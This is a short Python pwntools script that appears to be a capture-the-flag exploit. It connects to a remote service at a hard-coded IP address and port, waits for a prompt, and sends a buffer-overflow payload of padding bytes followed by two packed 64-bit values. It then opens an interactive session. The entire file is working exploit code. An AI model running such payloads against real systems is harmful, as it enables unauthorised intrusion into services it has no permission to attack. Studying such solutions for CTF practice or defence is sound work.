from pwn import *

#p = process('./task')
p = remote('117.78.27.105',31118)

p.recvuntil('But Whether it starts depends on you.\n')

payload = 'A'*0x18 + p64(0x7FFFFFFFFFFFFFFF) + p64(0x3fb999999999999a)
p.send(payload)

p.interactive()
